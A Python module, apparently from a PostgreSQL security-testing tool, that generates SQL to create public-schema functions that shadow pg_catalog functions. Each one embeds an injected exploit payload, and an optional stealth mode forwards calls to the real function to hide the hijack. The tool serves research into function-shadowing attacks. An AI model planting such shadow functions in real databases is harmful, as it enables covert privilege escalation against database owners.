# Copyright (c) 2022 Aiven, Helsinki, Finland. https://aiven.io
import json
from core.utils import convert_rettype, pgtype_get_names_map, get_test_value_for_type


class DBFunction:
    def __init__(self, name, params_type, initial_params_type, initial_rettype, exploit_payload, stealth_mode=True, track_execution=False):
        self.name = name
        self.params_type = params_type
        self.initial_params_type = initial_params_type
        self.nparams = len(self.params_type)
        self.initial_rettype = initial_rettype
        self.rettype = convert_rettype(self.initial_rettype)
        self.created = False
        self.exploit_payload = exploit_payload
        self.stealth_mode = stealth_mode
        self.test_ok = False

        pg_type_names = pgtype_get_names_map()
        argnames = "abcdefghijklmnopqrstuvwxyz"
        params_names = []
        test_params = []
        inargs = []
        callargs = []
        for i in range(0, self.nparams):
            tn = pg_type_names[self.params_type[i]]
            params_names.append(tn)
            inargs.append(f"IN {argnames[i]} {tn}")
            rtypecast = pg_type_names[self.initial_params_type[i]]
            callargs.append("%s%s" % (argnames[i], f"::{rtypecast}" if not rtypecast.startswith("any") else ""))
            test_params.append(get_test_value_for_type(self.initial_params_type[i]))
        inargs = ", ".join(inargs)
        callargs = ", ".join(callargs)

        self.drop_query = "drop function public.%s(%s)" % (self.name, ", ".join(params_names))
        self.test_query = "select %s(%s)" % (self.name, ", ".join(test_params))

        if self.stealth_mode:
            base_qry = f"""
                create function public.{self.name}({inargs})
                returns {pg_type_names[self.rettype]} as
                $$
                    %s%s
                    select pg_catalog.{self.name}({callargs});
                $$
                language sql;
            """
        else:
            base_qry = f"""
                create function public.{self.name}({inargs})
                returns integer as
                $$
                    %s%s
                    select 1;
                $$
                language sql;
            """

        if track_execution:
            tracker = """
                insert into pghostile.triggers (fname, params, current_query) values ('%s', '%s', current_query());
            """ % (self.name, json.dumps(params_names))
        else:
            tracker = ""

        self.create_query_test = base_qry % ("", "create function public.___test_wrapper() returns integer as 'select 1' language sql;")
        self.create_query_exploit = base_qry % (tracker, self.exploit_payload)

    def __str__(self):
        return "%s %s" % (self.name, ", ".join([str(i) for i in self.params_type]))

    def __eq__(self, o):
        return str(self) == str(o)